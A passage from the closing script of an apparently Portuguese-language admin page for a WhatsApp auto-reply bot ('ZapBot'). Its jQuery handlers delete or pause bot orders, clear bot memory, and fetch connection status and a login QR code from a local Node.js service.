                    .text('Falha ao comunicar com api/send_media.php.')
                    .show();
            },
            complete: function() {
                btn.html(originalHtml).prop('disabled', false);
                window.scrollTo(0, 0);
            }
        });
    });

    // Funções de Controle de Ordens
    window.deleteOrder = function(id, numero) {
        if (!confirm('Deseja excluir esta ordem? O robô parará de responder esse número.')) return;
        $.post('api/delete_order.php', { id: id, numero: numero }, function(res) {
            let r = JSON.parse(res);
            if (r.status === 'success') {
                location.reload();
            } else {
                alert('Erro: ' + r.message);
            }
        });
    };

    window.togglePause = function(id, numero, status) {
        $.post('api/toggle_pause.php', { id: id, numero: numero, status: status }, function(res) {
            let r = JSON.parse(res);
            if (r.status === 'success') {
                location.reload();
            } else {
                alert('Erro: ' + r.message);
            }
        });
    };

    window.clearBotMemory = function() {
        if (!confirm('ATENÇÃO: Isso fará o robô PARAR DE RESPONDER a todos os números atuais. Deseja continuar?')) return;
        $.post('api/clear_memory.php', {}, function(res) {
            let r = JSON.parse(res);
            alert(r.message);
            location.reload();
        });
    };

    // --- WhatsApp Modal Integration ---
    let qrTimer = null;

    $('#whatsappModal').on('show.bs.modal', function () {
        checkWppStatus();
        // Check every 3 seconds while modal is open
        qrTimer = setInterval(checkWppStatus, 3000);
    });

    $('#whatsappModal').on('hide.bs.modal', function () {
        if(qrTimer) clearInterval(qrTimer);
    });

    function checkWppStatus() {
        $.get('http://localhost:3000/status', function(res) {
            if(res.status === 'connected') {
                $('#qr-container').hide();
                $('#connected-container').show();
            } else if(res.status === 'qr_ready') {
                $('#connected-container').hide();
                $('#qr-container').show();
                fetchQrCode();
            } else {
                $('#connected-container').hide();
                $('#qr-container').show();
                $('#qr-container h6').text('Iniciando ZapBot, aguarde o QR Code...');
                $('#qr-container .fa-qrcode').parent().html('<i class="fas fa-spinner fa-spin fa-5x text-secondary"></i>');
            }
        }).fail(function() {
            $('#qr-container h6').html('<span class="text-danger">A API do Node.js está desligada (Servidor fora do ar).</span>');
        });
    }

    function fetchQrCode() {
        $.get('http://localhost:3000/qr', function(res) {
            if(res.success && res.base64) {
                $('#qr-container h6').text('Escaneie o QR Code abaixo:');
                $('#qr-container .p-4').html('<img src="' + res.base64 + '" width="220" height="220" alt="WhatsApp QR" />');
            }
        });
    }

    window.logoutWhatsApp = function() {
        if(!confirm('Deseja realmente desconectar o WhatsApp atual e gerar um novo QR Code?')) return;
        
        $.post('http://localhost:3000/logout', function(res) {
            if(res.success) {
                // Reset visual do modal
                $('#connected-container').hide();
                $('#qr-container').show();
                $('#qr-container h6').text('Reiniciando, aguarde o novo QR Code...');
                $('#qr-container .p-4').html('<i class="fas fa-spinner fa-spin fa-5x text-secondary"></i>');
                
                // Força check de status imediato
                setTimeout(checkWppStatus, 2000);
            } else {
                alert('Erro ao desconectar: ' + res.message);
            }
        }).fail(function() {
            alert('Falha ao comunicar com o servidor Node.js.');
        });
    }

});
</script>
</body>
</html>
